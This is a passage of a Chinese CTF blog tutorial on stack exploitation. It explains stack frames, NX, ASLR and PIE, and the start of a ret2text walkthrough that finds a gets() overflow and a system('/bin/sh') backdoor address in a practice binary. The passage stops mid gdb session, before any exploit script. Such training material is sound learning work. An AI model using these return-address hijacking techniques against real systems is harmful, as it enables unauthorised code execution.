href="#%E8%BD%AF%E4%BB%B6%E9%98%B2%E6%8A%A4-7"><span class="nav-number">4.2.4.</span> <span class="nav-text">软件防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IDA%E5%88%86%E6%9E%90-9"><span class="nav-number">4.2.5.</span> <span class="nav-text">IDA分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF-9"><span class="nav-number">4.2.6.</span> <span class="nav-text">攻击思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC-7"><span class="nav-number">4.2.7.</span> <span class="nav-text">攻击脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BROP"><span class="nav-number">4.3.</span> <span class="nav-text">BROP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="nav-number">4.4.</span> <span class="nav-text">栈迁移</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E8%BE%85%E5%8A%A9%E6%80%A7%E6%BC%8F%E6%B4%9E"><span class="nav-number">5.</span> <span class="nav-text">其他辅助性漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA"><span class="nav-number">5.1.</span> <span class="nav-text">整型溢出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-number">5.2.</span> <span class="nav-text">格式化字符串</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%87%91%E4%B8%9D%E9%9B%80%E9%98%B2%E6%8A%A4%E7%BB%95%E8%BF%87"><span class="nav-number">5.3.</span> <span class="nav-text">金丝雀防护绕过</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E5%90%8E%E9%9D%A2"><span class="nav-number">6.</span> <span class="nav-text">写在后面</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93"><span class="nav-number">6.1.</span> <span class="nav-text">简单总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-number">6.2.</span> <span class="nav-text">参考资料</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="BoyChai"
      src="https://avatars.githubusercontent.com/u/88495409?s=96&v=4">
  <p class="site-author-name" itemprop="name">BoyChai</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">43</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">17</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">75</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/BoyChai" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;BoyChai" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:admin@boychai.xyz" title="E-Mail → mailto:admin@boychai.xyz" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://space.bilibili.com/277637284" title="Bilibili → https:&#x2F;&#x2F;space.bilibili.com&#x2F;277637284" rel="noopener me" target="_blank"><i class="fab fa-bilibili fa-fw"></i>Bilibili</a>
      </span>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://blog.boychai.xyz/2025/05/11/PWN-%E6%A0%88%E7%B3%BB%E5%88%97%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/88495409?s=96&v=4">
      <meta itemprop="name" content="BoyChai">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BoyChai's Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="PWN-栈系列总结 | BoyChai's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          PWN-栈系列总结
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-05-11 19:34:00" itemprop="dateCreated datePublished" datetime="2025-05-11T19:34:00+00:00">2025-05-11</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CTF%E7%9B%B8%E5%85%B3/" itemprop="url" rel="index"><span itemprop="name">CTF相关</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CTF%E7%9B%B8%E5%85%B3/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
  
  <span class="post-meta-item">
    
    <span class="post-meta-item-icon">
      <i class="far fa-comment"></i>
    </span>
    <span class="post-meta-item-text">Waline：</span>
  
    <a title="waline" href="/2025/05/11/PWN-%E6%A0%88%E7%B3%BB%E5%88%97%E6%80%BB%E7%BB%93/#waline" itemprop="discussionUrl">
      <span class="post-comments-count waline-comment-count" data-path="/2025/05/11/PWN-%E6%A0%88%E7%B3%BB%E5%88%97%E6%80%BB%E7%BB%93/" itemprop="commentCount"></span>
    </a>
  </span>
  
  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>14k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>49 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1 id="栈基础知识"><a href="#栈基础知识" class="headerlink" title="栈基础知识"></a>栈基础知识</h1><h2 id="栈基础概念"><a href="#栈基础概念" class="headerlink" title="栈基础概念"></a>栈基础概念</h2><p>栈是程序运行时的一块区域，主要用于存储临时数据、管理函数调用和返回地址。他有很多的特点，他是一种后进先出的数据结构，操作主要有压栈与出栈两种，并且在程序的内存中他的数据是从高地址往低地址走的。简单说，就是程序运行时的“临时记事本”。<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250510144043.png"></p>
<h2 id="栈顶与栈底"><a href="#栈顶与栈底" class="headerlink" title="栈顶与栈底"></a>栈顶与栈底</h2><p>对于栈有两个比较重要的寄存器，一个是栈顶一个是栈顶，在32位操作系统中，寄存器EBP表示栈底，ESP表示栈顶。栈底代表当前栈的最开始的位置，栈顶很好理解，就是栈的最顶部，在操作栈的时候主要分为压栈和出栈，具体是下面两个汇编指令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push ebx  <span class="comment"># 压栈，ebx的数据压入栈顶，并且ESP(栈顶) + size</span></span><br><span class="line">pop edx   <span class="comment"># 出栈，将栈顶数据放置到edx中，并且ESP(栈顶) - size </span></span><br></pre></td></tr></table></figure>
<p>具体参考图如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250510153227.png"></p>
<p>这两个操作都是基于栈顶的位置进行操作，并且操作的时候会修改栈顶(ESP)的指向位置。</p>
<h2 id="函数调用过程"><a href="#函数调用过程" class="headerlink" title="函数调用过程"></a>函数调用过程</h2><p>上面说栈主要是用来存储临时数据、管理函数调用和返回地址，可以参考下面程序的调用过程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> c = sum(a, b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用下面命令编译出32位可执行程序</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -S -fno-asynchronous-unwind-tables -masm=intel main.c -o main.asm</span><br></pre></td></tr></table></figure>
<p>通过IDA可以拿到下面汇编指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">	.file	&quot;main.c&quot;</span><br><span class="line">	.intel_syntax noprefix</span><br><span class="line">	.text</span><br><span class="line">	.globl	sum</span><br><span class="line">	.type	sum, @function</span><br><span class="line">sum:</span><br><span class="line">	push	ebp</span><br><span class="line">	mov	ebp, esp</span><br><span class="line">	call	__x86.get_pc_thunk.ax</span><br><span class="line">	add	eax, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_</span><br><span class="line">	mov	edx, DWORD PTR 8[ebp]</span><br><span class="line">	mov	eax, DWORD PTR 12[ebp]</span><br><span class="line">	add	eax, edx</span><br><span class="line">	pop	ebp</span><br><span class="line">	ret</span><br><span class="line">	.size	sum, .-sum</span><br><span class="line">	.globl	main</span><br><span class="line">	.type	main, @function</span><br><span class="line">main:</span><br><span class="line">	push	ebp</span><br><span class="line">	mov	ebp, esp</span><br><span class="line">	sub	esp, 16</span><br><span class="line">	call	__x86.get_pc_thunk.ax</span><br><span class="line">	add	eax, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_</span><br><span class="line">	mov	DWORD PTR -4[ebp], 1</span><br><span class="line">	mov	DWORD PTR -8[ebp], 2</span><br><span class="line">	push	DWORD PTR -8[ebp]</span><br><span class="line">	push	DWORD PTR -4[ebp]</span><br><span class="line">	call	sum</span><br><span class="line">	add	esp, 8</span><br><span class="line">	mov	DWORD PTR -12[ebp], eax</span><br><span class="line">	mov	eax, 0</span><br><span class="line">	leave</span><br><span class="line">	ret</span><br><span class="line">	.size	main, .-main</span><br><span class="line">	.section	.text.__x86.get_pc_thunk.ax,&quot;axG&quot;,@progbits,__x86.get_pc_thunk.ax,comdat</span><br><span class="line">	.globl	__x86.get_pc_thunk.ax</span><br><span class="line">	.hidden	__x86.get_pc_thunk.ax</span><br><span class="line">	.type	__x86.get_pc_thunk.ax, @function</span><br><span class="line">__x86.get_pc_thunk.ax:</span><br><span class="line">	mov	eax, DWORD PTR [esp]</span><br><span class="line">	ret</span><br><span class="line">	.ident	&quot;GCC: (Debian 14.2.0-19) 14.2.0&quot;</span><br><span class="line">	.section	.note.GNU-stack,&quot;&quot;,@progbits</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>对于当前学习的栈来说，还不需要过度的去解读汇编指令，比较重要的部分主要是main函数的下面指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">main:</span><br><span class="line">	push	ebp</span><br><span class="line">	mov	ebp, esp</span><br><span class="line">	......</span><br><span class="line">	call	sum</span><br><span class="line">	add	esp, 8</span><br><span class="line">	......</span><br><span class="line">	pop	ebp</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>
<p>还有sum函数的下面指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sum:</span><br><span class="line">	push	ebp</span><br><span class="line">	mov	ebp, esp</span><br><span class="line">	......</span><br><span class="line">	pop	rbp</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>
<p>C语言函数被编译之后起初的两个汇编指令都会是下面两条指令来初始化自己的栈</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push	ebp</span><br><span class="line">mov	ebp, esp</span><br></pre></td></tr></table></figure>
<p><code>push ebp</code>即把EBP压入当前的栈中，<code>mov ebp,esp</code>把当前的esp(栈顶)当作当前函数的ebp(栈底)，这一步的作用是给当前函数基于当前栈数据高一块新的栈位置，即栈内数据是当前函数的，做一个分割。在main函数中，最初的寄存器都是由系统基于函数调用约定自动给布局的，所以当前可以先不在意这一部分，重点看main的<code>call</code>指令，他这里调用了sum函数，实际是干了两个事情，他会把当前的EIP寄存器压入栈顶，然后把EIP寄存器指向sum函数的地址，其中EIP的作用是当前命令执行的位置，call指令执行前之前可以参考下图<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250510183255.png"><br>进入sum函数之后先初始化栈去执行<code>push ebp</code>和<code>mov ebp,esp</code>，具体参考图如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250510182553.png"><br>执行过后的栈内容除了上一个函数的栈底之外已经没有内容了，当前栈中的内容全部都是当前函数的一个栈数据区域。我们继续看执行<code>pop ebp</code>和<code>ret</code>干了什么，如下图<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250510184345.png"><br><code>pop ebp</code>恢复了父函数<code>main</code>的rbp，<code>ret</code>恢复了父函数call之后的<code>eip</code>即运行指针。后续就是main函数结束运行了。对于栈漏洞主要是围绕上面操作进行的，尤其是<code>ret</code>指令，需要深入的理解这一个过程。</p>
<h1 id="系统防护"><a href="#系统防护" class="headerlink" title="系统防护"></a>系统防护</h1><p>这一部分可以先跳过，直接去看简单栈溢出，这里是对系统防护我自己的一些总结和思考<br>，在下面章节做题遇到防护可以返回当前板块查看。</p>
<h2 id="NX防护"><a href="#NX防护" class="headerlink" title="NX防护"></a>NX防护</h2><p><code>NX</code>防护，全称<code>The No-eXecute bits</code>，程序与操作系统的防护措施，编译时决定是否生效，由操作系统实现。<br>它通过在内存页的标识中增加“执行”位，可以表示该内存页是否可以执行，若程序代码的EIP执行至不可运行的内存页，则CPU将直接拒绝执行“命令”造成程序崩溃。大白话就是在程序运行的时候，哪些位置可以执行，哪些不可以执行都给标注好了，如果这个开启的话那么一般就不会出现通过自己构造shellcode到内存中执行。典型题目<code>ret2shellcode</code>，他的这个防护是没有开启的，并且这道题目还对内核有要求。如果在用gcc编译程序的时候想要关闭nx防护可以添加参数<code>-z execstack</code>。</p>
<h2 id="ASLR防护"><a href="#ASLR防护" class="headerlink" title="ASLR防护"></a>ASLR防护</h2><p>全称<code>Address Space Layout Randomization</code>，系统的防护措施，他的主要作用是随机化内存中的地址，一个程序，运行多次，某个内容每一次运行的内存地址都不相同，程序装载时生效。默认系统中应该是开启的，具体验证方式如下<br>查看系统文件<code>/proc/sys/kernel/randomize_va_space</code>，如果是0则就是没有随机化的，也就是ASLR是关闭状态。如果是1，那么就是保留的随机化，他的共享库、栈、mmap()、以及VDSO将被随机化。如果等于2，那么就是完全的随机化，在保留的随机化(状态为1时)的基础上，通过br()分配的内存空间也将被随机化。</p>
<h3 id="为什么开启了ASLR有些地址还是可以直接使用？"><a href="#为什么开启了ASLR有些地址还是可以直接使用？" class="headerlink" title="为什么开启了ASLR有些地址还是可以直接使用？"></a>为什么开启了ASLR有些地址还是可以直接使用？</h3><p>在启用了 ASLR（地址空间布局随机化）的系统中，不同的内存区域会受到不同程度的随机化影响。其中会直接受到ASLR的影响的如下</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">栈、堆、共享库</span><br></pre></td></tr></table></figure>
<p>受ASLR影响较小的内存区域，相对稳定不会更变地址的如下</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plt表、got表、代码段(text段)、全局变量(data段)、静态数据段(bss段)、TLS</span><br></pre></td></tr></table></figure>
<h2 id="PIE防护"><a href="#PIE防护" class="headerlink" title="PIE防护"></a>PIE防护</h2><p>PIE防护主要是给EIF到内存加载过程中，bss、text、data这些段的随机化，如果PIE开启的话这些的地址也会被随机化。</p>
<h3 id="PIE与ASLR的关系"><a href="#PIE与ASLR的关系" class="headerlink" title="PIE与ASLR的关系"></a>PIE与ASLR的关系</h3><p>ASLR 随机的是加载地址，它需要 PIE 的配合才能让 .text&#x2F;.data&#x2F;.bss 被随机，如果程序不是 PIE，text 是固定的，不会被 ASLR 动<br>PIE 是编译出来的位置无关代码，它只是让 ASLR 能够生效在主程序段上（包括 text&#x2F;bss&#x2F;data）<br>然后libc中内置的函数本身就是PIE的，他们编译都会带着个东西。</p>
<h1 id="简单栈溢出"><a href="#简单栈溢出" class="headerlink" title="简单栈溢出"></a>简单栈溢出</h1><h2 id="栈溢出漏洞"><a href="#栈溢出漏洞" class="headerlink" title="栈溢出漏洞"></a>栈溢出漏洞</h2><p>在上面可以了解到在函数调用之后需要通过<code>ret</code>修改EIP寄存器，EIP这个寄存器非常重要，他指向的内容就是他后续执行的命令，在栈中如果可以通过某些办法修改ret的返回地址，就可以做到控制程序执行流的效果。栈溢出是指在一个程序中，本身栈可能就只有10空间的大小，而通过函数读取数据的时候读入了大于10的数据量就会产生栈溢出，如果溢出的位置达到了ret的返回地址那么我们就可以实现上述的控制执行流的效果。加单举个栈溢出的例子，代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> a[<span class="number">10</span>];</span><br><span class="line">    <span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line">    read(<span class="number">0</span>, a, <span class="number">11</span>);</span><br><span class="line">    <span class="keyword">if</span> (b)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;栈溢出成功\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里向里面输入11个<code>1</code>或者10个<code>1</code>都会输出栈溢出成功，输入10个也可以成功的原因是因为发送时回车也会占用空间，所以10个数据也会造成栈溢出，正常来说b应该是0即false，就不会进行输出，这里通过读取11个字符到a变量中发生栈溢出修改b为非零即true，触发if进行输出。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ┌──(root㉿BoyChaiWindows)-[/mnt/e/CTF例题/PWN/总结/栈溢出]</span><br><span class="line">└─# ./main</span><br><span class="line">1111111111</span><br><span class="line">栈溢出成功</span><br></pre></td></tr></table></figure>
<p>后面会看几道相关的例题分别是ret2text、ret2shellcode、ret2syscall。</p>
<h2 id="ROP-导向编程"><a href="#ROP-导向编程" class="headerlink" title="ROP-导向编程"></a>ROP-导向编程</h2><p>目前被广泛使用的攻击手法是 返回导向编程 (Return Oriented Programming)，其主要思想是在 栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。后续基本都是围绕着这个攻击手法进行，通过一次修改ret的地址控制整个的执行流程。</p>
<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><h3 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a>题目来源</h3><p>下载位置： <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text</a><br>PS：内容来自于CTF-WIKI</p>
<h3 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/pwn]</span><br><span class="line">└─$ file ret2text</span><br><span class="line">ret2text: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=4f13f004f23ea39d28ca91f2bb83110b4b73713f, with debug_info, not stripped</span><br></pre></td></tr></table></figure>
<p>程序类型位32位ELF文件</p>
<h3 id="防护措施"><a href="#防护措施" class="headerlink" title="防护措施"></a>防护措施</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/pwn]</span><br><span class="line">└─$ checksec --file=ret2text</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   83 Symbols        No    0               2               ret2text</span><br></pre></td></tr></table></figure>
<p>防护措施好像就有个NX，NX是不允许在堆栈中执行shellcode</p>
<h3 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h3><p>main函数内容如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;There is something amazing here, do you know anything?&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Maybe I will tell you next time !&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到<code>gets</code>往s里面传值了，但是s的长度是100，这里就是一个简单的栈溢出。之后还找到了一个程序后门，代码内容如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">secure</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> input; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> secretcode; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v0 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  secretcode = rand();</span><br><span class="line">  __isoc99_scanf((<span class="type">int</span>)&amp;unk_8048760, (<span class="type">int</span>)&amp;input);</span><br><span class="line">  <span class="keyword">if</span> ( input == secretcode )</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关于<code>system(/bin/sh)</code>他就是留下的后门。。这里看一下他的详细信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0804863</span>A ; <span class="number">11</span>:     system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>他的地址是<code>0804863A</code>。</p>
<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>使用栈溢出把程序结束时的返回地址改成后门的执行地址也就是<code>0804863A</code>，但是栈需要溢出多少位还不知道需要动态分析一下。</p>
<h3 id="溢出长度"><a href="#溢出长度" class="headerlink" title="溢出长度"></a>溢出长度</h3><p>这里通过gdb动态调试来去看溢出长度</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/pwn]</span><br><span class="line">└─$ gdb ret2text</span><br><span class="line">pwndbg&gt; b main</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">pwndbg&gt; n</span><br><span class="line">pwndbg&gt; n</span><br><span class="line">pwndbg&gt; n</span><br><span class="line">hello</span><br><span class="line">25      <span class="keyword">in</span> ret2text.c</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">───────────────────────────────────────────────────[ 